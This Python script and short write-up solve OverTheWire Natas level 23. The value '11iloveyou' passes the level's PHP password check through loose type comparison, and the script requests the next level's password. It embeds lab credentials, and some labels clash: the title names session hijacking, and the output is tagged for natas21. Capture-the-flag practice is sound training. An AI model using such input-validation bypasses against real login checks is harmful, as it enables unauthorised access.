#!/usr/bin/env python3
'''
Level 23 → Level 24
Cross-site Session Hijacking : Python Web Hacking
https://github.com/psmiraglia/ctf/blob/master/overthewire/natas/natas23.md
github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas22.py
https://github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas23.py
Username: natas23
URL:      http://natas23.natas.labs.overthewire.org
          http://natas23.natas.labs.overthewire.org/index-source.html
=======================================================
 <?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>
===========================================
username = 'natas23'
password = 'chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ'
problem:


write up: The Password must comply with both conditions
   strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )
   so passward like '11iloveyou'  will be good.
'''
import requests
import re
username = 'natas23'
password = 'D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE'


url = 'http://%s.natas.labs.overthewire.org/' % username
session = requests.Session()
response = session.get(url, auth = (username, password) )
content = response.text
print("1. response.text \n------------------\n",response.text)


session = requests.Session()

# response = session.get(url, auth = (username, password))
response = session.post(url, data = {"passwd": "11iloveyou"}, auth = (username, password))
print("2. response.text \n------------------\n",response.text)

print ("\nPassword for natas21 = ", re.findall('Password: (.*)',response.text)[0])
#Password for natas21 =  OsRmXFguozKpTZZ5X14zNO43379LZveg</pre>